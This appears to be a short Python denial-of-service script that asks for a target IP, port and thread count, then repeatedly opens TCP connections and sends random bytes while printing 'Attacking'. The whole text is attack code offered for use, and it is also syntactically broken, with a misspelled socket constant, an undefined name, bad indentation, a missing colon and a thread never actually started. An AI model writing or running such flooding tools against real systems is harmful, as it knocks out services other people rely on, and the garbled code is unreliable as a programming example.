# 1
#!/usr/bin/python3

import socket
import random
import threading

ip = str(input('[+] Target: '))
port = int(input('[+] Port: '))
pack = int(input('[+] packet/s'))
thread = int(input('[+] Threads '))



def start():
    hh = random._urandom(10)
    xx = int(0)
    while True:
        try:
             s = socket.socket(socket.AF.INET, SOCK_STREAM)
             s.connect((ip,port))
             s.send(hh)
        xx += l
        print('Attacking '+ip+' | sent: '+str(xx))
    except:
       s.close()
    print('Done')
    

for x in range(thread)
    thred = threading.Thread(target=start)
    thread.start
    
